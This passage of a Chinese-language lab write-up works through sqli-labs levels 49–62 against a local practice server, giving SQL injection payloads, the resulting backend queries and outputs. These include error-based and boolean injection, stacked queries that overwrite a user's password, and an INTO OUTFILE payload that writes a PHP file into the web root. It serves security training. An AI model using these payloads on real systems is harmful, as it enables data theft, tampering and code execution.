phpinfo();?&gt;  <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="level-49"><a href="#level-49" class="headerlink" title="level-49"></a>level-49</h3><p><strong>ORDER BY-无报错回显-单引号-盲注-注入</strong><br>原理类似level-48，闭合单引号即可，仅给出布尔注入，不展开了<br>1、布尔注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">49</span>/?sort=<span class="number">0</span><span class="string">&#x27; or length(database())=8 or &#x27;</span></span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> length(database())=<span class="number">8</span> <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">回显</span><br><span class="line">等同于order by <span class="number">1</span>，即sort=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="level-50"><a href="#level-50" class="headerlink" title="level-50"></a>level-50</h3><p><strong>ORDER BY-有报错回显-堆叠注入-注入</strong><br>1、报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-50/?sort=1 or updatexml(1,concat(0x7e,(database()),0x7e),1)</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY 1 or updatexml(1,concat(0x7e,(database()),0x7e),1)</span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure><p>2、堆叠注入，因为查询函数为mysqli_multi_query</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">50</span>/?sort=<span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;333&#x27;</span> where username =<span class="string">&#x27;Dumb&#x27;</span>;</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;333&#x27;</span> where username =<span class="string">&#x27;Dumb&#x27;</span>;</span><br><span class="line">回显，成功修改</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">333</span></span><br></pre></td></tr></table></figure><p>3、文件写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-50/?sort=1;select 1,2,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-50\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY 1;select 1,2,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-50\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020</span><br><span class="line">回显，test.php</span><br><span class="line">123&lt;?php phpinfo();?&gt;  </span><br></pre></td></tr></table></figure><h3 id="level-51"><a href="#level-51" class="headerlink" title="level-51"></a>level-51</h3><p><strong>ORDER BY-有报错回显-单引号-堆叠注入-注入</strong><br>原理同level-50，只不过加了单引号，注意闭合即可，仅展示报错注入，其他不展开了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">51</span>/?sort=<span class="number">1</span><span class="string">&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;</span></span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="level-52"><a href="#level-52" class="headerlink" title="level-52"></a>level-52</h3><p><strong>ORDER BY-无报错回显-堆叠注入-注入</strong><br>原理类似level-50，无报错回显,仅展示堆叠注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">52</span>/?sort=<span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;343&#x27;</span> where username =<span class="string">&#x27;Dumb&#x27;</span>;</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;343&#x27;</span> where username =<span class="string">&#x27;Dumb&#x27;</span>;</span><br><span class="line">回显，修改成功</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">343</span></span><br></pre></td></tr></table></figure><h3 id="level-53"><a href="#level-53" class="headerlink" title="level-53"></a>level-53</h3><p><strong>ORDER BY-无报错回显-单引号-堆叠注入-注入</strong><br>原理同level-52，注意单引号闭合即可，仅展示堆叠注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">53</span>/?sort=<span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">443</span><span class="string">&#x27; where username =&#x27;</span>Dum<span class="string">b&#x27;;</span></span><br><span class="line"><span class="string">后端</span></span><br><span class="line"><span class="string">SELECT * FROM users ORDER BY &#x27;</span><span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">443</span><span class="string">&#x27; where username =&#x27;</span>Dum<span class="string">b&#x27;;&#x27;</span></span><br><span class="line">回显，修改成功 </span><br><span class="line"><span class="number">1</span>Dumb<span class="number">443</span></span><br></pre></td></tr></table></figure><h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><p>challenges是贴近实战的测试，主要限制了试错次数。</p><h3 id="level-54"><a href="#level-54" class="headerlink" title="level-54"></a>level-54</h3><p>用单引号加注释测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">54</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">返回正确，说明后台只是加了单引号</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">继续爆字段，直接猜测为3个，不行就4个，不用order by，浪费次数，以及这样可以直接出利用位置</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-54/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span> Your Password:<span class="number">3</span></span><br><span class="line"></span><br><span class="line">利用位置<span class="number">3</span>，爆表</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">54</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Your Login name:2 Your Password:u3s457bfxv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆字段</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-54/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;u3s457bfxv&#x27;</span>%<span class="number">23</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="built_in">id</span>,sessid,secret_I2EY,tryy</span><br><span class="line"></span><br><span class="line">爆值</span><br><span class="line">GAT DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">54</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,2,secret_I2EY from u3s457bfxv%23</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">DUAj72iD5Abea04ua8qIXd7g</span></span><br><span class="line"><span class="string">提交之后成功</span></span><br></pre></td></tr></table></figure><h3 id="level-55"><a href="#level-55" class="headerlink" title="level-55"></a>level-55</h3><p>使用单引号加注释测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">55</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;%23 无回显</span></span><br><span class="line"><span class="string">测试了6次得到。。。。。</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-55/?id=1) %23</span></span><br><span class="line"><span class="string">直接猜字段为3</span></span><br><span class="line"><span class="string">GET DATA </span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-55/?id=-1)  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Your Login name:2 Your Password:g1e3zfujs5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆字段</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-55/?id=-1)  union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>g1e3zfujs5<span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Your Login name:2 Your Password:id,sessid,secret_FXZC,tryy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆值</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-55/?id=-1)  union select 1,2,secret_FXZC from g1e3zfujs5%23</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Your Login name:2 Your Password:t92gntGas0AeUxo7Sjpg8mGZ</span></span><br><span class="line"><span class="string">提交成功</span></span><br></pre></td></tr></table></figure><h3 id="level-56"><a href="#level-56" class="headerlink" title="level-56"></a>level-56</h3><p>单引号+注释测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">56</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;%23 失败</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-56/?id=1&#x27;</span>) <span class="keyword">or</span> <span class="number">1</span> %<span class="number">23</span> 成功</span><br><span class="line">这里发现，最好还是用 <span class="keyword">or</span> <span class="number">1</span>，单纯注释符有时候莫名通过</span><br><span class="line"></span><br><span class="line">还是猜测字段为<span class="number">3</span></span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">56</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Your Password:tnkca4stlm</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆字段</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-56/?id=-1&#x27;</span>) union select <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;tnkca4stlm&#x27;</span>%<span class="number">23</span></span><br><span class="line">回显</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">56</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>tnkca4stlm<span class="string">&#x27;%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆值</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-56/?id=-1&#x27;</span>) union select <span class="number">1</span>,<span class="number">2</span>,secret_QUFJ <span class="keyword">from</span> tnkca4stlm%<span class="number">23</span></span><br><span class="line">回显</span><br><span class="line">Your Password:mMva7E0J8QnTlW0PUdryGK3T</span><br><span class="line">提交成功</span><br></pre></td></tr></table></figure><h3 id="level-57"><a href="#level-57" class="headerlink" title="level-57"></a>level-57</h3><p>还是 单引号+注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">57</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or 1 %23 失败</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-57/?id=-1&quot; or 1 %23 成功</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜测字段数为3</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-57/?id=-1&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Your Login name:2 Your Password:dyf6pnyj47</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆字段</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-57/?id=-1&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>dyf6pnyj47<span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Your Password:id,sessid,secret_XYQT,tryy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆值</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-57/?id=-1&quot; union select 1,2,secret_XYQT  from dyf6pnyj47%23</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Your Password:6E1816JZRP4jhcOqchtdZ7dJ</span></span><br><span class="line"><span class="string">提交成功</span></span><br></pre></td></tr></table></figure><h3 id="level-58"><a href="#level-58" class="headerlink" title="level-58"></a>level-58</h3><p>单引号+注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">58</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; or 1 %23 成功</span></span><br><span class="line"><span class="string">猜测字段数为3</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-58/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database() %<span class="number">23</span></span><br><span class="line">回显</span><br><span class="line">Your Password : dhakkan</span><br><span class="line"></span><br><span class="line">爆字段</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="level-59"><a href="#level-59" class="headerlink" title="level-59"></a>level-59</h3><p>传统技能，单引号+注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">58</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or 1%23   成功</span></span><br><span class="line"><span class="string">爆表</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-58/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()%<span class="number">23</span>    发现不行，返回值不对</span><br><span class="line"></span><br><span class="line">尝试报错</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">58</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; </span></span><br><span class="line"><span class="string">报错回显</span></span><br><span class="line"><span class="string">near &#x27;</span><span class="string">&#x27;-1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span>，根据我们的总结，去掉两边的单引号，去掉我们加的单引号，即原始数据 即 <span class="string">&#x27;-1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> ，得到后端加了单引号</span><br><span class="line">因为有报错，所以使用报错注入</span><br><span class="line"></span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">58</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or  updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or &#x27;</span></span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~x6crc9emn7~&#x27;</span></span><br><span class="line"></span><br><span class="line">爆字段</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">58</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or  updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>x6crc9emn7<span class="string">&#x27;),0x7e),1) or &#x27;</span></span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~id,sessid,secret_RCKC,tryy~&#x27;</span></span><br><span class="line"></span><br><span class="line">爆值</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">58</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or  updatexml(1,concat(0x7e,(select secret_RCKC FROM x6crc9emn7 ),0x7e),1) or &#x27;</span></span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~muBRf6S2lwVs3z2I0NG9Zeul~&#x27;</span></span><br><span class="line">提交成功</span><br></pre></td></tr></table></figure><h3 id="level-60"><a href="#level-60" class="headerlink" title="level-60"></a>level-60</h3><p>可以看到，有报错会很快，所以我们先不加注释，为了避免错过报错<br>使用-1+单引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">60</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;失败</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-60/?id=-1&quot; 报错</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">near &#x27;</span><span class="string">&quot;-1&quot;</span><span class="string">&quot;) LIMIT 0,1&#x27; at line 1，根据公式 去掉两边单引号，去掉我们加的双引号，得  &quot;</span>-<span class="number">1</span><span class="string">&quot;) LIMIT 0,1 ，后端加了双引号 小括号</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">报错注入</span></span><br><span class="line"><span class="string">爆表</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-60/?id=-1&quot;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;~3ureov2qfe~&#x27;</span></span><br><span class="line"><span class="string">爆字段</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-60/?id=-1&quot;</span> <span class="keyword">or</span>  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;3ureov2qfe&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆值</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-60/?id=-1&quot;</span> <span class="keyword">or</span>  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select secret_7ULB <span class="keyword">from</span> 3ureov2qfe),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;~3AipH2Izlxv4x1osqnglsOka~&#x27;    </span></span><br><span class="line"><span class="string">提交成功</span></span><br></pre></td></tr></table></figure><h3 id="level-61"><a href="#level-61" class="headerlink" title="level-61"></a>level-61</h3><p>单引号 -1 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">61</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; 报错</span></span><br><span class="line"><span class="string">use near &#x27;</span><span class="string">&#x27;-1&#x27;</span><span class="string">&#x27;)) LIMIT 0,1&#x27;</span> at line <span class="number">1</span>，根据公式，去除首位单引号，以及我们加的单引号，得 <span class="string">&#x27;-1&#x27;</span>)) LIMIT <span class="number">0</span>,<span class="number">1</span>，两个括号，离谱。。。</span><br><span class="line"></span><br><span class="line">爆表</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">61</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;)) or  updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)  or ((&#x27;</span> </span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~68tg9myn2b~&#x27;</span></span><br><span class="line"></span><br><span class="line">爆字段</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">61</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;)) or  updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>68tg9myn2<span class="string">b&#x27;),0x7e),1)  or ((&#x27;</span> </span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~id,sessid,secret_I5F8,tryy~&#x27;</span></span><br><span class="line"></span><br><span class="line">爆值</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">61</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;)) or  updatexml(1,concat(0x7e,(select secret_I5F8 from 68tg9myn2b),0x7e),1)  or ((&#x27;</span> </span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~0bZkkQZ3DEeXUFe8BBwKNFK4~&#x27;</span></span><br><span class="line">提交成功</span><br></pre></td></tr></table></figure><h3 id="level-62"><a href="#level-62" class="headerlink" title="level-62"></a>level-62</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">62</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) or 1%23 成功</span></span><br></pre></td></tr></table></figure><p>纯布尔盲注，exp待补<br>参考代码：<br><a href="https://poet.gitbook.io/sqli-labs/writeup-1/lesson-62">Lesson-62</a></p><h3 id="level-63"><a 